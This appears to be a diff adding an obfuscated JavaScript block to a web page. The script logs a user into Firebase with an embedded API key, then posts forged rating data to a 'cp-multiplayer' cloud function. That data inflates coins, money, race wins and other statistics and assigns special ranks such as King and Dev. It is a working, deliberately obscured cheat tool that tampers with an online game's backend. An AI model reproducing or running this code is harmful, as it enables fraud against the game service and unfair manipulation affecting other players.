+const _0x5921a3=_0x21ab;function _0x21ab(_0x4a67ce,_0xb12fa7){const _0x333b7a=_0x117d();return _0x21ab=function(_0xf3365e,_0x285373){_0xf3365e=_0xf3365e-(0xee9+0x11cb+-0x1ff5);let _0x532038=_0x333b7a[_0xf3365e];return _0x532038;},_0x21ab(_0x4a67ce,_0xb12fa7);}(function(_0x5e208c,_0x412173){const _0x133e2c={_0x40d70f:0xd9,_0x419217:0x154,_0x3eaa87:0xc7,_0x100b9e:0x17b},_0x3565b1=_0x21ab,_0x144ce7=_0x5e208c();while(!![]){try{const _0x4cf549=-parseInt(_0x3565b1(_0x133e2c._0x40d70f))/(0x19b1+-0x221e+0x2*0x437)*(parseInt(_0x3565b1(_0x133e2c._0x419217))/(-0x2*0x1f2+0x1415+-0x3*0x565))+parseInt(_0x3565b1(0x179))/(0x1381+0x51*0x63+-0x32d1)*(-parseInt(_0x3565b1(0x16d))/(-0x11f0+-0x4*-0x557+-0x6d*0x8))+parseInt(_0x3565b1(_0x133e2c._0x3eaa87))/(-0xdd8+-0x1*0x883+0x1660)*(-parseInt(_0x3565b1(0x108))/(-0x248f+-0x101*-0x7+-0x9da*-0x3))+parseInt(_0x3565b1(0xed))/(0x12e4+0x9d*-0x29+-0x10c*-0x6)+-parseInt(_0x3565b1(0x175))/(-0xd*-0xf1+0xf32+-0x1b67)+-parseInt(_0x3565b1(_0x133e2c._0x100b9e))/(-0x2631+-0x1*0xba5+0x31df)+parseInt(_0x3565b1(0xdc))/(-0x13aa+-0x6f7+0x1aab);if(_0x4cf549===_0x412173)break;else _0x144ce7['push'](_0x144ce7['shift']());}catch(_0x34d666){_0x144ce7['push'](_0x144ce7['shift']());}}}(_0x117d,0x158c85+0x1*-0x1a7152+0x2cb0c*0x7));const GAME_CPM={'api_key':_0x5921a3(0xf6)+_0x5921a3(0x125)+_0x5921a3(0x12b)+_0x5921a3(0xff),'rank_url':_0x5921a3(0x13e)+_0x5921a3(0x1a4)+_0x5921a3(0x127)+_0x5921a3(0x12e)+_0x5921a3(0x17c)+_0x5921a3(0x167)+_0x5921a3(0x117)};let currentUser=null,currentToken=null;function updateStatus(_0x1e68e5,_0x4ffa24=_0x5921a3(0xd2),_0x479e8d=_0x5921a3(0x11e)){const _0x2ee511={_0x928830:0x141,_0x1215af:0xc1,_0x4f95b6:0xcc,_0x1b84ec:0x15d,_0x1574b2:0x156},_0x414a58=_0x5921a3,_0x2a70b5={'ojhXk':function(_0x318f57,_0x4f5c3e){return _0x318f57===_0x4f5c3e;},'hMEzd':_0x414a58(0xcd),'RgMXi':_0x414a58(0x181)+_0x414a58(_0x2ee511._0x928830),'fVZgN':function(_0x234e36,_0x1d3340){return _0x234e36===_0x1d3340;},'dPCPN':_0x414a58(0x146),'IQXyW':_0x414a58(0x178)+'or'},_0x44bd83=document[_0x414a58(0x188)+_0x414a58(_0x2ee511._0x1215af)](_0x479e8d);_0x44bd83[_0x414a58(_0x2ee511._0x4f95b6)+'t']=_0x1e68e5,_0x44bd83[_0x414a58(0x15a)]=_0x2a70b5[_0x414a58(0x12f)](_0x4ffa24,_0x2a70b5[_0x414a58(0x15c)])?_0x2a70b5[_0x414a58(0x11d)]:_0x2a70b5[_0x414a58(_0x2ee511._0x1b84ec)](_0x4ffa24,_0x2a70b5[_0x414a58(0x158)])?_0x2a70b5[_0x414a58(_0x2ee511._0x1574b2)]:'';}async function loginFirebase(){const _0x1b3e3a={_0x1a1d39:0x1a0,_0x3cb653:0x1a6,_0x30d58d:0x146,_0x34eaab:0x1a5,_0x44e8fb:0x173,_0x2b1b32:0x164,_0x1bf364:0x153,_0x3130da:0x120,_0x40779b:0x116,_0x24f26f:0xd8,_0x1db1af:0xcd,_0x2a0515:0x10f,_0x25ea0d:0x188,_0x4406ce:0xc1,_0x12dd87:0xde,_0x4480b0:0xfc,_0x25fe8b:0x129,_0x38da80:0x183,_0x2e6afb:0x18c,_0x465933:0x118,_0x38a87f:0x13a,_0xb21fc5:0xe6,_0x48da2d:0xc2,_0x550cef:0x169,_0x273768:0xd4,_0x3312ce:0xfd,_0x499c14:0xf0,_0x4e0880:0xfd,_0x4422b4:0x13a,_0x5f0a87:0x177,_0x122d92:0x188,_0x300ce3:0xc1,_0x592f3c:0x170,_0x4cec14:0x12c,_0x3af439:0x172,_0xa8a1af:0x16f,_0x444a28:0x12c,_0x12168a:0x182,_0x3a7ae7:0x146,_0x373bee:0xfb,_0x3fbb8b:0x183,_0x280ddb:0x17d,_0x31db19:0xf9},_0xce384c=_0x5921a3,_0x50b059={'qjxGk':function(_0x1d07d9,_0x380c28,_0x4b3273,_0x1efe32){return _0x1d07d9(_0x380c28,_0x4b3273,_0x1efe32);},'HJMIg':_0xce384c(_0x1b3e3a._0x1a1d39)+_0xce384c(_0x1b3e3a._0x3cb653)+_0xce384c(0x165)+_0xce384c(0xd5),'LcyuJ':_0xce384c(_0x1b3e3a._0x30d58d),'kcZdn':_0xce384c(_0x1b3e3a._0x34eaab)+_0xce384c(0xea),'DFMaW':_0xce384c(0x137),'jmNCN':_0xce384c(_0x1b3e3a._0x44e8fb),'aCcxC':function(_0x28bccd,_0x4cb5a5){return _0x28bccd||_0x4cb5a5;},'RktzH':function(_0x415b4f,_0x2d3c01,_0x251bd2){return _0x415b4f(_0x2d3c01,_0x251bd2);},'QjIpN':_0xce384c(0x148)+_0xce384c(_0x1b3e3a._0x2b1b32)+_0xce384c(0xc6),'nwcVB':function(_0x39694b,_0x1bb5cd){return _0x39694b(_0x1bb5cd);},'OMdJC':_0xce384c(_0x1b3e3a._0x1bf364),'fwuBd':_0xce384c(_0x1b3e3a._0x3130da),'NAADN':_0xce384c(_0x1b3e3a._0x40779b)+_0xce384c(_0x1b3e3a._0x24f26f),'MuYQO':_0xce384c(0xe9),'IyaEp':_0xce384c(_0x1b3e3a._0x1db1af),'rtLCW':_0xce384c(0xd1),'HlcsU':_0xce384c(0xc0),'KpGen':_0xce384c(_0x1b3e3a._0x2a0515)+'s','Wtywt':_0xce384c(0x133),'WvolW':function(_0x13db8b,_0x1f90bd){return _0x13db8b===_0x1f90bd;},'sssIR':_0xce384c(0x19c),'mfebc':function(_0x4cf92c,_xc53398,_0x23e3e5){return _0x4cf92c(_xc53398,_0x23e3e5);},'jJjPN':_0xce384c(0x1a2)+_0xce384c(0x14c),'JpiCF':_0xce384c(0x139)+_0xce384c(0x193)},_0x10f648=document[_0xce384c(_0x1b3e3a._0x25ea0d)+_0xce384c(_0x1b3e3a._0x4406ce)](_0x50b059[_0xce384c(_0x1b3e3a._0x12dd87)])[_0xce384c(_0x1b3e3a._0x4480b0)][_0xce384c(0xce)](),_0x2cab61=document[_0xce384c(0x188)+_0xce384c(_0x1b3e3a._0x4406ce)](_0x50b059[_0xce384c(_0x1b3e3a._0x25fe8b)])[_0xce384c(0xfc)];if(_0x50b059[_0xce384c(0x115)](!_0x10f648,!_0x2cab61)){_0x50b059[_0xce384c(0x13a)](updateStatus,_0x50b059[_0xce384c(0x180)],_0x50b059[_0xce384c(_0x1b3e3a._0x38da80)]);return;}_0x50b059[_0xce384c(_0x1b3e3a._0x2e6afb)](updateStatus,_0x50b059[_0xce384c(_0x1b3e3a._0x465933)]);try{const _0x49e86f=await _0x50b059[_0xce384c(_0x1b3e3a._0x38a87f)](fetch,_0xce384c(0x166)+_0xce384c(0x13c)+_0xce384c(_0x1b3e3a._0xb21fc5)+_0xce384c(0xf5)+_0xce384c(0x187)+_0xce384c(0x105)+_0xce384c(0x10e)+_0xce384c(_0x1b3e3a._0x48da2d)+GAME_CPM[_0xce384c(_0x1b3e3a._0x550cef)],{'method':_0x50b059[_0xce384c(_0x1b3e3a._0x273768)],'headers':{'Content-Type':_0x50b059[_0xce384c(0x171)]},'body':JSON[_0xce384c(0x186)]({'email':_0x10f648,'password':_0x2cab61,'returnSecureToken':!![]})}),_0x312e06=await _0x49e86f[_0xce384c(0x163)]();if(_0x312e06[_0xce384c(_0x1b3e3a._0x3312ce)]){const _0x5321fd=_0x50b059[_0xce384c(0xd0)][_0xce384c(_0x1b3e3a._0x499c14)]('|');let _0x384091=0x249*0xb+0x2*-0x673+-0xc3d;while(!![]){switch(_0x5321fd[_0x384091++]){case'0':currentToken=_0x312e06[_0xce384c(_0x1b3e3a._0x4e0880)];continue;case'1':_0x50b059[_0xce384c(_0x1b3e3a._0x4422b4)](updateStatus,_0xce384c(0x135)+'\x20'+_0x10f648,_0x50b059[_0xce384c(_0x1b3e3a._0x5f0a87)]);continue;case'2':document[_0xce384c(_0x1b3e3a._0x122d92)+_0xce384c(_0x1b3e3a._0x300ce3)](_0x50b059[_0xce384c(0x191)])[_0xce384c(_0x1b3e3a._0x592f3c)][_0xce384c(_0x1b3e3a._0x4cec14)]=_0x50b059[_0xce384c(_0x1b3e3a._0x3af439)];continue;case'3':document[_0xce384c(0x188)+_0xce384c(_0x1b3e3a._0x300ce3)](_0x50b059[_0xce384c(_0x1b3e3a._0xa8a1af)])[_0xce384c(_0x1b3e3a._0x592f3c)][_0xce384c(_0x1b3e3a._0x444a28)]=_0x50b059[_0xce384c(0xe3)];continue;case'4':currentUser=_0x10f648;continue;}break;}}else{_0x50b059[_0xce384c(0x18d)](updateStatus,_0xce384c(0xe1)+_0xce384c(0x15f)+(_0x312e06[_0xce384c(_0x1b3e3a._0x3a7ae7)]?.[_0xce384c(_0x1b3e3a._0x373bee)]||_0x50b059[_0xce384c(0x101)]),_0x50b059[_0xce384c(0x183)]);}}catch(_0x47a64f){_0x50b059[_0xce384c(0x18d)](updateStatus,_0x50b059[_0xce384c(_0x1b3e3a._0x31db19)],_0x50b059[_0xce384c(_0x1b3e3a._0x38da80)]);}}function _0x117d(){const _0x390fe8=['qjxGk','xpPgI','4567010pmBKHO','taxi','levels','split','jqOAq','money','tXQnD','):\x20','ntitytoolk','AIzaSyBW1Z','tDJAe','❌\x20Request\x20','JpiCF','svMQi','message','value','idToken','dlgyJ','rRgrQGPTM','kzelD','jJjPN','treasure','ZiKQB','SwUMy','ingparty/v','UbzuV','AprXM','73194AueJIo','time','krgZU','qfbxv','fuel','CwEjC','erifyPassw','menuButton','utZEu','Sneev','rank','RkXTT','delivery','aCcxC','applicatio','rRating4','OMdJC','speed_bann','uccessfull','NDfUs','drift_max','RgMXi','status','reactions','POST','error:\x20','rank_value','\x20(ID:\x20','NcnVq','bMiUeDZHYU','IWKIW','cp-multipl','bmqxQ','jmNCN','WAzSR','O2bY8Bfnf5','display','lly!','ayer.cloud','ojhXk','d\x20Rank\x20res','zlwkU','ITvJR','block','et\x20to\x20init','Logged\x20in:','KING','email','youtubeRan','Connection','RktzH','keqZj','w.googleap','TzPro','https://us','xcSOC','BSxZP','cess','WtuHy','ial\x20values','cargo','wbnjd','error','text','Enter\x20emai','t_distance','Vskca','taJeR','ror','dtwYs','tDRuq','offroad','ank','❌\x20Network\x20','car_wash','Loading...','10sNezox','slicer_cut','IQXyW','rank_url','dPCPN','GxxZg','className','TBaMj','hMEzd','fVZgN','oYKfo','ed:\x20','passanger_','HJMIg','Rilap','json','l\x20and\x20pass','ase\x20login\x20','https://ww','net/SetUse','car_fix','api_key','FsGRN','igbloggerR','resetStats','34636dtOBys','coins','KpGen','style','NAADN','HlcsU','password','atus:\x20','11727648fphdBI','qXEDt','IyaEp','status-err','294Rwwswo','gifts','8621712TUzgRN','functions.','kcZdn','Cbgpd','作成中','QjIpN','status-suc','sssIR','LcyuJ','kingRank','\x20successfu','stringify','it/v3/rely','getElement','real_estat','Reset(作成中)','drift','nwcVB','mfebc','race_win','CcUxY','hCxdq','rtLCW','sxNEG','\x20error','run','HzJZP','\x20to\x20','car_trade','Setting\x20','oGzpr','failed\x20(St','car_exchan','bZTCQ',')...','YBJqH','phXaH','Session\x20ex','push_ups','Unknown\x20er','FPtHy','-central1-','serviceSta','pired,\x20ple','EwNIo','tiktokerRa','police','none','ById','ord?key=','cars','forEach','devRank','word','405YSyKON','dWcYN','WvolW','ijWyo','✅\x20Stats\x20an','textConten','success','trim','car_collid','MuYQO','loginForm','normal','block_post','fwuBd','again','\x20(ID:\x200)\x20s','Zzdej','n/json','339682iucTTr','distance','yqJyB','62672520dTMkYn','✅\x20Rank\x20set','DFMaW','lfhyW','burnt_tire','Login\x20fail','gzZes','Wtywt','Bearer\x20','substring','is.com/ide','...','KxIsv','4|0|1|2|3','tus'];_0x117d=function(){return _0x390fe8;};return _0x117d();}function requireLogin(){const _0x3ab50e={_0x2a9e44:0x165,_0x2de3b9:0xd5,_0x14bddd:0x146,_0x5e9f92:0x1a5,_0x33a61a:0xea,_0x42a640:0xf3,_0x2ba51c:0x176,_0x212764:0x162},_0x35c0ae=_0x5921a3,_0xb283ab={'tXQnD':function(_0x6715f3,_0x464b13){return _0x6715f3||_0x464b13;},'qXEDt':function(_0x5e8c82,_0x23ea38,_0x560997,_0x4f379e){return _0x5e8c82(_0x23ea38,_0x560997,_0x4f379e);},'Rilap':_0x35c0ae(0x1a0)+_0x35c0ae(0x1a6)+_0x35c0ae(_0x3ab50e._0x2a9e44)+_0x35c0ae(_0x3ab50e._0x2de3b9),'ZiKQB':_0x35c0ae(_0x3ab50e._0x14bddd),'xcSOC':_0x35c0ae(_0x3ab50e._0x5e9f92)+_0x35c0ae(_0x3ab50e._0x33a61a)};if(_0xb283ab[_0x35c0ae(_0x3ab50e._0x42a640)](!currentUser,!currentToken))return _0xb283ab[_0x35c0ae(_0x3ab50e._0x2ba51c)](updateStatus,_0xb283ab[_0x35c0ae(_0x3ab50e._0x212764)],_0xb283ab[_0x35c0ae(0x103)],_0xb283ab[_0x35c0ae(0x13f)]),![];return!![];}async function setRank(_0x3aacf7,_0x5c6642,_0x48b153=![]){const _0xc3bad9={_0x1459bc:0x1a5,_0x5760bd:0xea,_0x5eec7a:0xc3,_0x30d5ac:0x18b,_0x25093b:0x17a,_0xce6948:0xf2,_0x349357:0x16e,_0x7ed975:0xcf,_0x195a70:0x19b,_0x5376d1:0x197,_0x1379ab:0x152,_0x987395:0x155,_0x2cf7d9:0x11c,_0x47e5cd:0x144,_0x5c5e38:0x114,_0x4f28b0:0x10c,_0x19e27e:0x119,_0x179007:0x11f,_0xe0af8a:0x194,_0x602702:0x149,_0x401a38:0x102,_0x46ec72:0xda,_0x137c68:0x122,_0x59c437:0xcb,_0x4d3e23:0x134,_0x618474:0x143,_0x1d07e2:0x11a,_0x58a739:0x107,_0x3454d7:0x198,_0x34400c:0x19d,_0x2a64f2:0xc8,_0x1c62fd:0xca,_0x33f102:0xdf,_0x4f1f8a:0x19f,_0x18fda4:0x14d,_0x1f6faf:0x192,_0x22b174:0x140,_0x15dcc3:0x10b,_0x5cd300:0x14b,_0x33c4bb:0x199,_0x8fb4c3:0x142,_0x42e1fd:0x126,_0x8ffa6d:0x100,_0x4ec96c:0x113,_0x1c85a7:0x110,_0x331508:0x11b,_0x58e05b:0x16a,_0x10e659:0x190,_0x247226:0x186,_0x419bc2:0xec,_0x1effc7:0x196,_0x525c0a:0x185},_0x4a7827=_0x5921a3,_0x211ffd={'WAzSR':function(_0x41989c){return _0x41989c();},'AprXM':function(_0x63d158,_0x103e96,_0x56b399,_0x5d0cdd){return _0x63d158(_0x103e96,_0x56b399,_0x5d0cdd);},'dWcYN':_0x4a7827(0xd2),'SwUMy':_0x4a7827(_0xc3bad9._0x1459bc)+_0x4a7827(_0xc3bad9._0x5760bd),'TzPro':_0x4a7827(_0xc3bad9._0x5eec7a),'ijWyo':_0x4a7827(0x168),'tDJAe':_0x4a7827(_0xc3bad9._0x30d5ac),'svMQi':_0x4a7827(0xef),'FPtHy':_0x4a7827(_0xc3bad9._0x25093b),'UbzuV':_0x4a7827(_0xc3bad9._0xce6948),'lfhyW':_0x4a7827(_0xc3bad9._0x349357),'phXaH':_0x4a7827(0x18e),'YBJqH':_0x4a7827(_0xc3bad9._0x7ed975)+'ed','keqZj':_0x4a7827(_0xc3bad9._0x195a70)+'ge','ITvJR':_0x4a7827(_0xc3bad9._0x5376d1),'dtwYs':_0x4a7827(_0xc3bad9._0x1379ab),'sxNEG':_0x4a7827(_0xc3bad9._0x987395),'yqJyB':_0x4a7827(_0xc3bad9._0x2cf7d9),'BSxZP':_0x4a7827(_0xc3bad9._0x47e5cd),'GxxZg':_0x4a7827(_0xc3bad9._0x5c5e38),'CwEjC':_0x4a7827(0xee),'qfbxv':_0x4a7827(_0xc3bad9._0x4f28b0),'taJeR':_0x4a7827(0x14f),'NcnVq':_0x4a7827(_0xc3bad9._0x19e27e)+'er','Vskca':_0x4a7827(_0xc3bad9._0x179007),'Zzdej':_0x4a7827(0xbf),'oGzpr':_0x4a7827(_0xc3bad9._0xe0af8a),'WtuHy':_0x4a7827(0x189)+'e','IWKIW':_0x4a7827(_0xc3bad9._0x602702),'kzelD':_0x4a7827(_0xc3bad9._0x401a38),'RkXTT':_0x4a7827(0xd3),'TBaMj':_0x4a7827(0x1a1),'utZEu':_0x4a7827(0xe0),'CcUxY':_0x4a7827(0x160)+_0x4a7827(_0xc3bad9._0x46ec72),'NDfUs':_0x4a7827(0x109),'FsGRN':_0x4a7827(0x112),'hCxdq':_0x4a7827(_0xc3bad9._0x137c68),'xpPgI':_0x4a7827(_0xc3bad9._0x59c437)+_0x4a7827(0x130)+_0x4a7827(_0xc3bad9._0x4d3e23)+_0x4a7827(_0xc3bad9._0x618474)+_0x4a7827(0xd6)+_0x4a7827(_0xc3bad9._0x1d07e2)+'y!'};if(!_0x211ffd[_0x4a7827(0x12a)](requireLogin))return;_0x211ffd[_0x4a7827(_0xc3bad9._0x58a739)](updateStatus,_0x4a7827(_0xc3bad9._0x3454d7)+_0x5c6642+_0x4a7827(0x123)+_0x3aacf7+_0x4a7827(_0xc3bad9._0x34400c),_0x211ffd[_0x4a7827(_0xc3bad9._0x2a64f2)],_0x211ffd[_0x4a7827(0x104)]);const _0x1cd225=_0x48b153?0x1a19*-0x1+-0x1026+0x5*0x873:0xcd3db*0x5d9+-0x2*-0x3db25ef+-0x21f*0xae63e,_0x1aad03=_0x48b153?0x740+-0x384+-0x4*0xef:_0x3aacf7,_0x3b1796={},_0x108b85=[_0x211ffd[_0x4a7827(0x13d)],_0x211ffd[_0x4a7827(_0xc3bad9._0x1c62fd)],_0x211ffd[_0x4a7827(0xf7)],_0x211ffd[_0x4a7827(0xfa)],_0x211ffd[_0x4a7827(0x1a3)],_0x211ffd[_0x4a7827(0x106)],_0x211ffd[_0x4a7827(_0xc3bad9._0x33f102)],_0x211ffd[_0x4a7827(_0xc3bad9._0x4f1f8a)],_0x211ffd[_0x4a7827(0x19e)],_0x211ffd[_0x4a7827(0x13b)],_0x211ffd[_0x4a7827(0x132)],_0x211ffd[_0x4a7827(_0xc3bad9._0x18fda4)],_0x211ffd[_0x4a7827(_0xc3bad9._0x1f6faf)],_0x211ffd[_0x4a7827(0xdb)],_0x211ffd[_0x4a7827(_0xc3bad9._0x22b174)],_0x211ffd[_0x4a7827(0x159)],_0x211ffd[_0x4a7827(0x10d)],_0x211ffd[_0x4a7827(_0xc3bad9._0x15dcc3)],_0x211ffd[_0x4a7827(_0xc3bad9._0x5cd300)],_0x211ffd[_0x4a7827(0x124)],_0x211ffd[_0x4a7827(0x14a)],_0x211ffd[_0x4a7827(0xd7)],_0x211ffd[_0x4a7827(_0xc3bad9._0x33c4bb)],_0x211ffd[_0x4a7827(_0xc3bad9._0x8fb4c3)],_0x211ffd[_0x4a7827(_0xc3bad9._0x42e1fd)],_0x211ffd[_0x4a7827(_0xc3bad9._0x8ffa6d)],_0x211ffd[_0x4a7827(_0xc3bad9._0x4ec96c)],_0x211ffd[_0x4a7827(0x15b)],_0x211ffd[_0x4a7827(_0xc3bad9._0x1c85a7)],_0x211ffd[_0x4a7827(0x18f)]];_0x108b85[_0x4a7827(0xc4)](_0x5506d0=>_0x3b1796[_0x5506d0]=_0x1cd225),_0x3b1796[_0x211ffd[_0x4a7827(_0xc3bad9._0x331508)]]=_0x48b153?0xbb*0x23+-0x911+-0x30*0x58:-0x35*0x10626af5+-0xa96ad2e*0x9+0xa77c93b*0x95,_0x3b1796[_0x211ffd[_0x4a7827(_0xc3bad9._0x58e05b)]]=_0x1aad03,_0x3b1796[_0x211ffd[_0x4a7827(_0xc3bad9._0x10e659)]]=_0x1aad03;const _0x5f52b6={'data':JSON[_0x4a7827(_0xc3bad9._0x247226)]({'RatingData':_0x3b1796,'Rank':_0x1aad03})},_0x1ee04f=_0x48b153?_0x211ffd[_0x4a7827(_0xc3bad9._0x419bc2)]:_0x4a7827(0xdd)+_0x4a7827(_0xc3bad9._0x1effc7)+_0x5c6642+(_0x4a7827(_0xc3bad9._0x525c0a)+_0x4a7827(0x12d));await _0x211ffd[_0x4a7827(_0xc3bad9._0x58a739)](sendRequest,GAME_CPM[_0x4a7827(0x157)],_0x5f52b6,_0x1ee04f);}async function sendRequest(_0x24cf23,_0x2aa005,_0x470a88){const _0x2badeb={_0x472dd5:0x14c,_0x429709:0x146,_0x213773:0x116,_0x326849:0xd8,_0x2213fb:0x1a5,_0xaa2bef:0x1a7,_0x147fa6:0x131,_0x2c9283:0xe4,_0x1cf7a6:0x111,_0x565a44:0x147,_0x3470e2:0xf8,_0x4a56de:0x174,_0x4debbd:0x11e,_0x9b4bfe:0xf4,_0x2ca6bf:0xe2,_0x5dc5b2:0xe8,_0x304ddb:0x17e,_0x23c23b:0x14e,_0x41ae06:0x195,_0x4d44e6:0xe2,_0x2d7466:0x151,_0x3c3805:0x121,_0x6b379a:0xfb,_0xe86b2f:0xe2},_0x26fe34=_0x5921a3,_0x14fbab={'wbnjd':function(_0x358d2c,_0x3c8516,_0x46a9b0){return _0x358d2c(_0x3c8516,_0x46a9b0);},'HzJZP':_0x26fe34(0x1a2)+_0x26fe34(_0x2badeb._0x472dd5),'gzZes':_0x26fe34(_0x2badeb._0x429709),'zlwkU':_0x26fe34(0x120),'dlgyJ':_0x26fe34(_0x2badeb._0x213773)+_0x26fe34(_0x2badeb._0x326849),'bmqxQ':function(_0x4077e9,_0x3e2c40,_0x5baace,_0x2b93c6){return _0x4077e9(_0x3e2c40,_0x5baace,_0x2b93c6);},'Sneev':_0x26fe34(0xcd),'KxIsv':_0x26fe34(_0x2badeb._0x2213fb)+_0x26fe34(0xea),'Cbgpd':function(_0xee97f,_0x565564){return _0xee97f===_0x565564;},'tDRuq':_0x26fe34(_0x2badeb._0xaa2bef),'oYKfo':_0x26fe34(0xf1),'krgZU':function(_0x10edce,_0x474aa6,_0x254b16,_0x8613d5){return _0x10edce(_0x474aa6,_0x254b16,_0x8613d5);}};try{const _0x995bdf=await _0x14fbab[_0x26fe34(0x145)](fetch,_0x24cf23,{'method':_0x14fbab[_0x26fe34(_0x2badeb._0x147fa6)],'headers':{'Authorization':_0x26fe34(_0x2badeb._0x2c9283)+currentToken,'Content-Type':_0x14fbab[_0x26fe34(0xfe)]},'body':JSON[_0x26fe34(0x186)](_0x2aa005)});if(_0x995bdf['ok'])_0x14fbab[_0x26fe34(0x128)](updateStatus,_0x470a88,_0x14fbab[_0x26fe34(_0x2badeb._0x1cf7a6)],_0x14fbab[_0x26fe34(0xe8)]);else{const _0x1d2c53=await _0x995bdf[_0x26fe34(_0x2badeb._0x565a44)]();_0x14fbab[_0x26fe34(0x128)](updateStatus,_0x26fe34(_0x2badeb._0x3470e2)+_0x26fe34(0x19a)+_0x26fe34(_0x2badeb._0x4a56de)+_0x995bdf[_0x26fe34(_0x2badeb._0x4debbd)]+_0x26fe34(_0x2badeb._0x9b4bfe)+_0x1d2c53[_0x26fe34(0xe5)](0x1d*-0x25+0x3*-0x242+0xaf7,-0x9*0xab+0x1cec+-0x5*0x481)+_0x26fe34(0xe7),_0x14fbab[_0x26fe34(_0x2badeb._0x2ca6bf)],_0x14fbab[_0x26fe34(_0x2badeb._0x5dc5b2)]);}}catch(_0x469101){_0x14fbab[_0x26fe34(0x10a)](updateStatus,_0x26fe34(_0x2badeb._0x2d7466)+_0x26fe34(_0x2badeb._0x3c3805)+_0x469101[_0x26fe34(_0x2badeb._0x6b379a)],_0x14fbab[_0x26fe34(_0x2badeb._0xe86b2f)],_0x14fbab[_0x26fe34(0xe8)]);}}window[_0x5921a3(0x184)]=()=>setRank(0x1*0x9fb+0x119+-0x2*0x587,_0x5921a3(0x136)),window[_0x5921a3(0x138)+'k']=()=>setRank(-0x19a0+0xd93+0xc15,_0x5921a3(0x17f)),window[_0x5921a3(0x1a8)+'nk']=()=>setRank(0xc*-0x2d7+-0x14*-0xa+0x2155*0x1,_0x5921a3(0x17f)),window[_0x5921a3(0x16b)+_0x5921a3(0x150)]=()=>setRank(0x1*-0x2515+-0xaed*-0x1+-0x3be*-0x7,_0x5921a3(0x17f)),window[_0x5921a3(0xc5)]=()=>setRank(-0x3*0x9ad+0x2*-0x109e+-0x3e4a*-0x1,_0x5921a3(0x17f)),window[_0x5921a3(0x16c)]=()=>setRank(0x930+-0x4*0x7cc+-0x200*-0xb,_0x5921a3(0x18a),!![]);
+</script>
 </body>
 </html>
